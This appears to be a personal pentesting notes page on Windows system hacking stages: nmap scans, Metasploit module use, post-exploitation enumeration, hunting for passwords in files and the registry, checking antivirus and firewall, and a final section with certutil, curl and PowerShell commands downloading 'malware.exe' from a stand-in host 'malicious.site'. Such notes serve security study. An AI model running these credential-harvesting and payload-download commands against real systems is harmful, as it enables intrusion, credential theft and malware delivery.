# Systems hacking stages (windows)

### 🛠️ Tools
- [mimikatz](https://github.com/gentilkiwi/mimikatz) – extract passwords
- [SeatBelt](https://github.com/GhostPack/Seatbelt) – discovery automation

## Information gathering

```bash
# the most basic intense scan
$ nmap -A -T4 <TARGET_IP>

# Get operating system info with stealth scan
$ nmap -sS -A -T4 -O <TARGET_IP>
```

## Initial access methods

- LNK shortcut with custom icon where the target value is a script

## Exploitation

- Metasploit
    - msfconsole (console)
    - armitage (GUI)

- Search for exploits based on the scans
```bash
# -p shows the full path to the exploit
msf6> searchsploit <some-service> <version> -p

msf6> search <someKeyWord>
```

Basic metasploit syntax
```bash
# exploit module example
msf6> use exploits/windows/smb/psexec.rb
msf6> show options
msf6> set payload path/to/the/payload
msf6> set RHOST <ip>
msf6> set RPORT <port>
msf6> exploit

# auxiliary module example
msf6> use auxiliary/scanner/ssh/ssh_version.rb
msf6> set RHOST <addr>
msf6> set RPORT <port>
msf6> run

msf6> exit
```

---

## Local enumeration

### System enumeration

```bash
# spawns a native windows shell
meterpreter> shell

# operating system information
> systeminfo
> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# only hotfixes
> wmic qfe

# operating system's hostname
> hostname

# drives attached to the system
> wmic logicaldisk get caption

# currently running processes
> tasklist /SVC
```

### User and group enumeration

```bash
# current user
> whoami

# current user's privileges
> whoami /priv

# current user's groups
> whoami groups

# list users active on the system
> net user

# particular active user (lateral escalation)
> net user <username>

# list users part of the administrators group
> net localgroup administrators
```

### Network enumeration

```bash
# list network interfaces
> ipconfig /all

# show routing table info
> route print

# list running services & ports
> netstat -ano
```

### Password enumeration

```bash
# find strings in files
> findstr /si password *.doc *.txt *.ini *.config

# find specific strings pertaining to services
> dir /s *pass* == *cred* == *ssh* == *.config*

# find passwords within the HKEY_LOCAL_MACHINE registry
> reg query HKLM /f password /t REG_SZ /s

# HKEY_CURRENT_USER registry
> reg query HKCU /f password /t REG_SZ /s

# find passwords in configuration files and
# session information for specific programs
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\<User>"
```

### Firewall and antivirus enumeration

```bash
# status of Windows Defender
> sc query windefend

# identify third-party antivirus
> sc queryex type=service

# show firewall status & configuration
> netsh firewall show state
```

Enumeration tools:
- Windows-Exploit-Suggester
    1. clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
    2. install requirements
    ```bash
    $ sudo apt install python-xlrd
    $ pip install xlrd --upgrade
    ```
    3. run `systeminfo` on the target machine and save output to *output.txt*
    4. run `download output.txt` on the meterpreter session 
    4. run windows-exploit-suggester on local machine
    ```bash
    $ ./windows-exploit-suggester.py --database db.xlsx --systeminfo output.txt
    ```
- winPEAS
    - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Sherlock
    - https://github.com/rasta-mouse/Sherlock
- Watson
    - https://github.com/rasta-mouse/Watson
- JAWS
    - https://github.com/411Hall/JAWS
- WebBrowserPassView
    - https://www.nirsoft.net/utils/web_browser_password.html

### Privilege escalation

See <a href="https://github.com/e2f5db0/cybersec-notes/systems/windows/privilege-escalation.md">windows/privilege-escalation.md</a>

---

### Dropping files

Files can be dropped in RDP copy-paste or download via web browser.

CLI:
```powershell
certutil.exe -urlcache -f https://malicious.site/file.exe -o malware.exe

curl.exe https://malicious.site/file.exe -o malware.exe

Invoke-WebRequest -Uri 'https://malicious.site/file.exe' -OutFile 'malware.exe'
```
